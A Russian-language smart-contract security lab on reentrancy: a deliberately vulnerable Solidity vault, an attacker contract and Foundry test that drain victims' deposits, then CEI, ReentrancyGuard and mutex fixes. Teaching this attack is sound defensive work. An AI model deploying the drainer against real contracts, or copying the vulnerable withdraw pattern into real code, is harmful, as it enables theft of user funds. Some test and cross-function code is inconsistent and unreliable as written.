Lab 04 · Reentrancy Attack & Defense

Reentrancy — уязвимость, которая привела к взлому The DAO в 2016 году на 60 млн долларов и остаётся одной из самых частых причин потери средств по сей день. В этой лабораторной работе вы напишете уязвимый контракт, атакуете его в Foundry-тесте, а затем последовательно примените три уровня защиты: CEI-паттерн, ReentrancyGuard и мьютекс для cross-function reentrancy. В финале запустите Slither и сравните отчёты для всех версий.

Что вы сделаете:
  • Напишете уязвимый EtherVault с withdraw, обновляющим баланс после перевода.
  • Напишете контракт Attacker, дренирующий VaultV1 через reentrancy.
  • Подтвердите атаку в Foundry-тесте: проверите, что весь ETH украден.
  • Исправите контракт по CEI-паттерну (VaultV2).
  • Добавите ReentrancyGuard из OpenZeppelin (VaultV3).
  • Реализуете cross-function reentrancy и защитите его общим мьютексом.
  • Запустите Slither на всех трёх версиях и проанализируете вывод.
Что сдать: скриншот Foundry-теста, подтверждающего атаку на VaultV1; отчёт Slither с объяснением каждого найденного предупреждения.

Задание 1

Напишите уязвимый контракт src/VaultV1.sol. Уязвимость: баланс обновляется после внешнего вызова (transfer ETH), что позволяет атакующему рекурсивно вызвать withdraw до обновления состояния. 

// src/VaultV1.sol — УЯЗВИМЫЙ КОНТРАКТ (намеренно!)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice НЕ ИСПОЛЬЗОВАТЬ В ПРОДАКШНЕ — намеренно уязвимый контракт
contract VaultV1 {
    mapping(address => uint256) public balances;

    receive() external payable {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice УЯЗВИМОСТЬ: внешний вызов происходит ДО обновления состояния
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // ❌ ПЛОХО: сначала отправляем ETH — это вызывает receive() у атакующего
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        // ❌ ПЛОХО: баланс обнуляется ПОСЛЕ перевода — слишком поздно!
        balances[msg.sender] = 0;
    }

    function totalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

Критерий приёмки: контракт компилируется; вы можете объяснить, в какой именно момент атакующий «вклинивается» в выполнение.

Задание 2

Напишите контракт src/Attacker.sol, который использует reentrancy для дренирования VaultV1 в одной транзакции. Атака: deposit 1 ETH, затем withdraw; в receive() снова вызываем withdraw, пока в vault есть ETH. 

// src/Attacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./VaultV1.sol";

contract Attacker {
    VaultV1 public vault;
    address public owner;

    constructor(address _vault) {
        vault  = VaultV1(payable(_vault));
        owner  = msg.sender;
    }

    /// @notice Запускает атаку: депозит + первый withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    /// @notice Рекурсивный re-enter при получении ETH
    receive() external payable {
        // Продолжаем дренировать, пока в vault есть ETH
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

Критерий приёмки: можете нарисовать стек вызовов атаки: attack() → vault.withdraw() → receive() → vault.withdraw() → … → обнуление balance.

Задание 3

Напишите Foundry-тест, подтверждающий, что атака успешно дренирует весь ETH из VaultV1. Тест должен: задеплоить vault с депозитами нескольких жертв, запустить атаку и проверить, что баланс vault = 0, а баланс атакующего вырос. 

// test/ReentrancyTest.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/VaultV1.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    VaultV1 vault;
    Attacker attacker;

    address victim1 = address(0x1);
    address victim2 = address(0x2);
    address attackerOwner = address(0x3);

    function setUp() public {
        vault    = new VaultV1();
        vm.prank(attackerOwner);
        attacker = new Attacker(address(vault));

        // Жертвы вносят депозиты
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(attackerOwner, 2 ether);

        vm.prank(victim1);
        vault.deposit{value: 5 ether}();

        vm.prank(victim2);
        vault.deposit{value: 5 ether}();
    }

    function test_ReentrancyDrainsVault() public {
        uint256 vaultBalanceBefore    = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("Vault balance before:", vaultBalanceBefore / 1e18, "ETH");
        console.log("Attacker balance before:", attackerBalanceBefore / 1e18, "ETH");

        // Запуск атаки
        vm.prank(attackerOwner);
        attacker.attack{value: 1 ether}();

        uint256 vaultBalanceAfter    = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("Vault balance after:", vaultBalanceAfter / 1e18, "ETH");
        console.log("Attacker balance after:", attackerBalanceAfter / 1e18, "ETH");

        // Vault полностью опустошён
        assertEq(vaultBalanceAfter, 0, "Vault should be drained");

        // Атакующий получил все депозиты жертв + свой 1 ETH
        assertGt(attackerBalanceAfter, vaultBalanceBefore,
            "Attacker should have stolen victims ETH");
    }
}

# Запуск с подробным выводом стека вызовов
forge test --match-test test_ReentrancyDrainsVault -vvvv

Критерий приёмки: тест проходит; в trace (-vvvv) видна рекурсия вызовов withdraw().

Задание 4

Исправьте уязвимость по паттерну CEI (Checks-Effects-Interactions): сначала проверки, затем изменение состояния, и только в последнюю очередь внешний вызов. Напишите src/VaultV2.sol и проверьте, что атака больше не работает. 

// src/VaultV2.sol — исправлено по CEI
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VaultV2 {
    mapping(address => uint256) public balances;

    receive() external payable {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        // ✅ Checks
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // ✅ Effects — обновляем состояние ДО внешнего вызова
        balances[msg.sender] = 0;

        // ✅ Interactions — внешний вызов в последнюю очередь
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    function totalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Добавьте в ReentrancyTest.t.sol:
import "../src/VaultV2.sol";

function test_CEIFixPreventsReentrancy() public {
    VaultV2 safeVault = new VaultV2();
    Attacker attackerV2 = new Attacker(payable(address(safeVault)));
    // Attacker.sol придётся адаптировать под VaultV2-интерфейс

    vm.deal(victim1, 5 ether);
    vm.prank(victim1);
    safeVault.deposit{value: 5 ether}();

    vm.deal(attackerOwner, 2 ether);
    vm.prank(attackerOwner);
    // Атака должна ревертнуться или украсть только свой 1 ETH
    attackerV2.attack{value: 1 ether}();

    // Жертвы не потеряли деньги
    assertEq(safeVault.balances(victim1), 5 ether);
}

Критерий приёмки: тест подтверждает, что VaultV2 защищён: атакующий получает только свой депозит, жертвы не теряют средства.

Задание 5

Добавьте защиту через ReentrancyGuard из OpenZeppelin — напишите src/VaultV3.sol. ReentrancyGuard использует storage-флаг, который блокирует рекурсивный вход в nonReentrant-функции. 

// src/VaultV3.sol — защищён ReentrancyGuard
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract VaultV3 is ReentrancyGuard {
    mapping(address => uint256) public balances;

    receive() external payable {}

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice nonReentrant блокирует рекурсивный вход
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // Здесь порядок CEI тоже соблюдён (defense-in-depth)
        balances[msg.sender] = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    function totalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

Изучите реализацию ReentrancyGuard в OpenZeppelin: как флаг _status хранится в storage и почему слот _NOT_ENTERED = 1, а не false = 0 (подсказка: gas cost инициализации storage).

Критерий приёмки: тест для VaultV3 аналогично подтверждает защиту; вы можете объяснить, сколько дополнительного газа стоит nonReentrant (~2300 gas на холодный storage slot).

Задание 6

Реализуйте cross-function reentrancy сценарий: контракт имеет функции withdraw и transfer, обе меняют общий маппинг балансов. Атакующий вклинивается через receive() и вызывает transfer, пока withdraw ещё не обновил баланс. Защитите его общим мьютексом. 

// src/CrossFunctionVault.sol — демонстрация cross-function reentrancy
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/// @notice Оба метода используют общий nonReentrant — защита от cross-function атак
contract CrossFunctionVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice nonReentrant блокирует вход в withdraw И transfer одновременно
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");
    }

    /// @notice nonReentrant на transfer тоже — один мьютекс на весь контракт
    function transfer(address to, uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to]         += amount;
    }
}

// 2. withdraw(2 ETH)
// 3. В receive() пытается вызвать transfer(victim, 2 ETH)
// Результат: должен получить ReentrancyGuardReentrantCall revert

Критерий приёмки: тест подтверждает revert при cross-function reentrancy; в комментарии объяснено, почему CEI на withdraw без nonReentrant на transfer недостаточно.
